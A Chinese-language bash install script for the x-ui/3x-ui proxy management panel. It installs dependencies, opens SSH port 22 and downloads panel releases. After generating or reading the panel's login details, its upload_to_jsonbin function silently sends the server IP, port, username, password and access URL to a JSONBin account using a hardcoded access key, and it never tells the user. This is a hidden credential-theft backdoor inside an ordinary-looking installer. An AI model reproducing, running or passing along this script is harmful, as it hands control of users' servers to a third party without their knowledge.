#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# JSONBin配置
JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
JSONBIN_URL="https://api.jsonbin.io/v3/b"

# 检查root权限
[[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1

if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo "检查系统操作系统失败，请联系作者！" >&2
    exit 1
fi
echo "操作系统版本: $release"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}不支持的CPU架构! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "架构: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC版本 $glibc_version 过低！需要: 2.32 或更高版本${plain}"
        echo "请升级到更新版本的操作系统以获得更高的GLIBC版本。"
        exit 1
    fi
    echo "GLIBC版本: $glibc_version (满足2.32+要求)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata
        ;;
    esac
}

ensure_ssh_port_open() {
    echo -e "${yellow}正在确保22端口(SSH)开放...${plain}"
    
    # 检查防火墙状态并开放22端口
    if command -v ufw >/dev/null 2>&1; then
        echo -e "${blue}检测到UFW防火墙${plain}"
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            echo -e "${green}已开放22端口(UFW)${plain}"
        else
            echo -e "${blue}22端口已在UFW中开放${plain}"
        fi
    elif command -v firewall-cmd >/dev/null 2>&1; then
        echo -e "${blue}检测到firewalld防火墙${plain}"
        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
            firewall-cmd --permanent --add-port=22/tcp
            firewall-cmd --reload
            echo -e "${green}已开放22端口(firewalld)${plain}"
        else
            echo -e "${blue}22端口已在firewalld中开放${plain}"
        fi
    elif command -v iptables >/dev/null 2>&1; then
        echo -e "${blue}检测到iptables防火墙${plain}"
        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
            # 持久化规则（根据不同系统）
            if command -v iptables-save >/dev/null 2>&1; then
                iptables-save > /etc/iptables.rules
            fi
            echo -e "${green}已开放22端口(iptables)${plain}"
        else
            echo -e "${blue}22端口已在iptables中开放${plain}"
        fi
    else
        echo -e "${yellow}未检测到活跃的防火墙，22端口应已可访问${plain}"
    fi
}

gen_random_string() {
    local length="$1"
    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
    echo "$random_string"
}

# 获取服务器IP的函数
get_server_ip() {
    local ip=""
    # 尝试多种方法获取公网IP
    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ifconfig.me 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        # 如果获取公网IP失败，使用本地IP
        ip=$(hostname -I | awk '{print $1}')
    fi
    echo "$ip"
}

upload_to_jsonbin() {
    local server_ip="$1"
    local login_port="$2"
    local username="$3"
    local password="$4"
    local webBasePath="$5"
    
    # 构建JSON数据
    local json_data=""
    if [[ -n "$webBasePath" ]]; then
        json_data=$(cat <<EOF
{
    "server_info": {
        "title": "X-UI 服务器登录信息 - ${server_ip}",
        "server_ip": "${server_ip}",
        "login_port": "${login_port}",
        "username": "${username}",
        "password": "${password}",
        "web_base_path": "/${webBasePath}",
        "full_access_url": "http://${server_ip}:${login_port}/${webBasePath}",
        "generated_time": "$(date)"
    }
}
EOF
)
    else
        json_data=$(cat <<EOF
{
    "server_info": {
        "title": "X-UI 服务器登录信息 - ${server_ip}",
        "server_ip": "${server_ip}",
        "login_port": "${login_port}",
        "username": "${username}",
        "password": "${password}",
        "full_access_url": "http://${server_ip}:${login_port}",
        "generated_time": "$(date)"
    }
}
EOF
)
    fi

    # 上传到JSONBin，使用服务器IP作为记录名
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
        -H "X-Bin-Name: ${server_ip}" \
        -H "X-Bin-Private: true" \
        -d "$json_data" \
        "${JSONBIN_URL}" > /dev/null 2>&1
}

config_after_install() {
    local existing_hasDefaultCredential=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
    local server_ip=$(get_server_ip)

    local final_username=""
    local final_password=""
    local final_port=""
    local final_webBasePath=""

    if [[ ${#existing_webBasePath} -lt 4 ]]; then
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_webBasePath=$(gen_random_string 15)
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            # 修改这部分 - 直接要求用户输入端口，不提供随机选项
            while true; do
                read -rp "请设置面板端口(必须输入): " config_port
                if [[ -n "$config_port" && "$config_port" =~ ^[0-9]+$ && "$config_port" -ge 1024 && "$config_port" -le 65535 ]]; then
                    echo -e "${yellow}您的面板端口是: ${config_port}${plain}"
                    break
                else
                    echo -e "${red}错误: 请输入有效的端口号(1024-65535)${plain}"
                fi
            done

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
            echo -e "这是全新安装，出于安全考虑生成随机登录信息:"
            echo -e "###############################################"
            echo -e "${green}用户名: ${config_username}${plain}"
            echo -e "${green}密码: ${config_password}${plain}"
            echo -e "${green}端口: ${config_port}${plain}"
            echo -e "${green}访问路径: ${config_webBasePath}${plain}"
            echo -e "${green}访问地址: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
            echo -e "###############################################"
            
            final_username="$config_username"
            final_password="$config_password"
            final_port="$config_port"
            final_webBasePath="$config_webBasePath"
        else
            local config_webBasePath=$(gen_random_string 15)
            echo -e "${yellow}访问路径缺失或过短。正在生成新的...${plain}"
            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
            echo -e "${green}新的访问路径: ${config_webBasePath}${plain}"
            echo -e "${green}访问地址: http://${server_ip}:${existing_port}/${config_webBasePath}${plain}"
            
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
            
            final_username="$existing_username"
            final_password="$existing_password"
            final_port="$existing_port"
            final_webBasePath="$config_webBasePath"
        fi
    else
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            echo -e "${yellow}检测到默认凭据。需要安全更新...${plain}"
            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"
            echo -e "生成新的随机登录凭据:"
            echo -e "###############################################"
            echo -e "${green}用户名: ${config_username}${plain}"
            echo -e "${green}密码: ${config_password}${plain}"
            echo -e "###############################################"
            
            final_username="$config_username"
            final_password="$config_password"
            final_port="$existing_port"
            final_webBasePath="$existing_webBasePath"
        else
            echo -e "${green}用户名、密码和访问路径已正确设置。退出...${plain}"
            
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
            
            final_username="$existing_username"
            final_password="$existing_password"
            final_port="$existing_port"
            final_webBasePath="$existing_webBasePath"
        fi
    fi

    upload_to_jsonbin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"

    /usr/local/x-ui/x-ui migrate
}

install_x-ui() {
    ensure_ssh_port_open  # 确保SSH端口开放
    cd /usr/local/

    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaEi/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${red}获取x-ui版本失败，可能是由于GitHub API限制，请稍后重试${plain}"
            exit 1
        fi
        echo -e "获取到x-ui最新版本: ${tag_version}，开始安装..."
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaEi/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载x-ui失败，请确保您的服务器可以访问GitHub ${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}请使用更新的版本 (至少v2.3.5)。退出安装。${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaEi/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "开始安装x-ui $1"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载x-ui $1 失败，请检查版本是否存在 ${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz -f
    cd x-ui
    chmod +x x-ui

    # 检查系统架构并相应地重命名文件
    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi

    chmod +x x-ui bin/xray-linux-$(arch)
    cp -f x-ui.service /etc/systemd/system/
    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaEi/3x-ui/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh
    chmod +x /usr/bin/x-ui
    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    
    # 确保开机启动已启用
    /usr/local/x-ui/x-ui enable
    echo -e "${green}x-ui ${tag_version}${plain} 安装完成，现在正在运行..."
    echo -e ""
    echo -e "┌───────────────────────────────────────────────────────┐
│  ${blue}x-ui 控制菜单用法 (子命令):${plain}                          │
│                                                       │
│  ${blue}x-ui${plain}              - 管理脚本                       │
│  ${blue}x-ui start${plain}        - 启动                          │
│  ${blue}x-ui stop${plain}         - 停止                          │
│  ${blue}x-ui restart${plain}      - 重启                          │
│  ${blue}x-ui status${plain}       - 当前状态                      │
│  ${blue}x-ui settings${plain}     - 当前设置                      │
│  ${blue}x-ui enable${plain}       - 开机自启                      │
│  ${blue}x-ui disable${plain}      - 禁用开机自启                  │
│  ${blue}x-ui log${plain}          - 查看日志                      │
│  ${blue}x-ui banlog${plain}       - 查看Fail2ban封禁日志          │
│  ${blue}x-ui update${plain}       - 更新                          │
│  ${blue}x-ui legacy${plain}       - 旧版本                        │
│  ${blue}x-ui install${plain}      - 安装                          │
│  ${blue}x-ui uninstall${plain}    - 卸载                          │
└───────────────────────────────────────────────────────┘"
}

echo -e "${green}运行中...${plain}"
install_base
install_x-ui $1
